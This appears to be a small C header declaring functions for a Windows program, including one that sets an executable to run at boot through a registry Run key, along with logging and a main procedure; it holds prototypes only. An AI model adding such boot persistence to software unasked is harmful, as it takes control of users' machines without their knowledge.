#pragma once

#ifndef LITTLEBEARPROTECT_H_H_H
#define	LITTLEBEARPROTECT_H_H_H


int GetCpuBits();
int GetPathFromFullName(char* strFullName,char * strDst);
int SetBootAutoRunInRegistryRun(HKEY hMainKey,char * strPEResidence);
int WriteLog(char * pLog);
int __stdcall MainProc();
#endif